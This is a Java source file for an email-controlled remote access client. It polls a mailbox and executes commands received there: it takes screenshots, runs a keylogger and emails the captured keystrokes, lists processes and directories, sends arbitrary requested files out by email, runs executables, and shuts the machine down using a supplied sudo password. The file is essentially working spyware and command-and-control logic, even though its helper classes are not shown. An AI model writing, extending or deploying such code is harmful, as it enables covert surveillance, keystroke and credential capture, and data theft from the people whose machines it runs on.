package com.util;

import javax.mail.MessagingException;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainClient {
    private static boolean takeShot(int id) {
        String subject = "res/" + id;
        try {
            SendMail.getInstance().sendMail(subject, null, Screenshot.getInstance().takeScreenShot(), true);
            return true;
        } catch (IOException | MessagingException e) {
            e.printStackTrace();
            return false;
        }
    }


    private static boolean keyLog(int id, long time) {
        String filename = "KEY LOG" + ZonedDateTime.now().format(DateTimeFormatter
                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
        try {
            KeyLogger.getInstance().startLog(filename, time);
            String subject = "res / " + id;
            SendMail.getInstance().sendMail(subject, null, filename, true);
            return true;
        } catch (IOException e) {
            System.out.println("Error log");
            e.printStackTrace();
            return false;
        } catch (MessagingException e) {
            System.out.println("Cannot send mail");
            e.printStackTrace();
            return false;
        }
    }

    private static boolean Shutdown(int id, String sudopass){
        try{

            int exitcode = ShutandLog.getInstance().Logout(sudopass);
            if (exitcode!=0){
                String subject = "res / " + id;
                try {
                    SendMail.getInstance().sendMail(subject, "Can't Shutdown, Exit code: "+exitcode, null, true);
                }catch (IOException | MessagingException er){
                    er.printStackTrace();
                }
                return false;
            }
            return true;
        }catch (Exception e){
            String subject = "res / " + id;
            try {
                SendMail.getInstance().sendMail(subject, "Can't Shutdown due to error: " + e.toString(), null, true);
            }catch (IOException | MessagingException er){
                er.printStackTrace();
            }
            e.printStackTrace();
            return false;
        }
    }

    private static boolean ListProcess(int id){
        String subject = "res/"+id;
        try{
            SendMail.getInstance().sendMail(subject,null, ProcessPC.getInstance().ProcessList(), true);
            return true;
        }catch(IOException | MessagingException e){
            e.printStackTrace();
            return false;
        }
    }

    private static boolean listDir(int id) {
        try {
            ListDir list = new ListDir("");
            String filename = "LIST DIR" + ZonedDateTime.now().format(DateTimeFormatter
                    .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
            list.listAll(filename);
            SendMail.getInstance().sendMail("res/" + id,null, filename, true);
            return true;
        } catch (IOException | MessagingException e) {
            System.out.println("error when list");
            e.printStackTrace();
            return false;
        }
    }

    public static boolean getFile(int id, String header) {
        try {
            Pattern pattern = Pattern.compile("\"(.*)\"");
            Matcher matcher = pattern.matcher(header);
            String filename = "bomaylaymay.txt";
            if (matcher.find()) {
                filename = matcher.group(1);
                System.out.println(filename);
            }
            Path file = Path.of(filename);
            if (Files.exists(file)) {
                if (Files.isRegularFile(file))
                    SendMail.getInstance().sendMail("res/" + id, null, filename, false);
                else {
                    SendMail.getInstance().sendMail("res/" + id + "/0000/You are request for a directory type"
                            , "directory request", null, false);
                }
            }
            else{
                SendMail.getInstance().sendMail("res/" + id + "/0000/File doesnt exists, try list Dir!"
                        , "File dont exist", null, false);
            }
            return true;
        } catch (IOException | MessagingException e) {
            System.out.println("can not get file");
            e.printStackTrace();
            return false;
        }
    }

    public static boolean runexefile(int id, String path)  {
        String subject = "res/"+id;
        try{
            Path file = Path.of(path);
            if (Files.exists(file)){
                if (Files.isRegularFile(file)){
                    SendMail.getInstance().sendMail(subject,Boolean.toString(ProcessPC.getInstance().StartProcess(path)),null, true);
                }
                else if (path.endsWith(".app")){
                    SendMail.getInstance().sendMail(subject,Boolean.toString(ProcessPC.getInstance().StartProcess(path)),null, true);
                }
                else {
                    SendMail.getInstance().sendMail("res/" + id + "/0000/You are request for a directory type"
                            , "directory request", null, true);
                }
            }else{
                SendMail.getInstance().sendMail("res/" + id + "/0000/File doesnt exists, try list Dir!"
                        , "File dont exist", null, true);
            }
            return true;
        }
        catch (IOException | MessagingException e){
            System.out.println("can not run file");
            e.printStackTrace();
            return false;
        }
    }

    public static boolean processRequest(String header) throws ArrayIndexOutOfBoundsException{
        String[] parts = header.split("/");
        System.out.println(Arrays.toString(parts));
        int id = Integer.parseInt(parts[1].trim());
        String command = parts[2].trim();
        if (command.equalsIgnoreCase("takeshot")) {
            return takeShot(id);
        }
        else if (command.equalsIgnoreCase("keylog")) {
            return keyLog(id, Long.parseLong(parts[3].trim()));
        }

        else if (command.equalsIgnoreCase("Shutdown")){
            if (parts.length > 3)
                return Shutdown(id,parts[3].trim());
            return Shutdown(id,"");
        } else if (command.equalsIgnoreCase("ListProcess")) {
            return ListProcess(id);
        }
        else if (command.equalsIgnoreCase("listdir")) {
            return listDir(id);
        } else if (command.equalsIgnoreCase("get")) {
            return getFile(id,header);
        } else if (command.equalsIgnoreCase("runexe")){
            String filepath = header.substring( 19+ 1).trim();
            return runexefile(id,filepath);
        }
        return false;
    }


    public static void main(String[] args) {
        System.out.println("Listeningg for request...");
        CheckMail.getInstance().listen();
    }
}
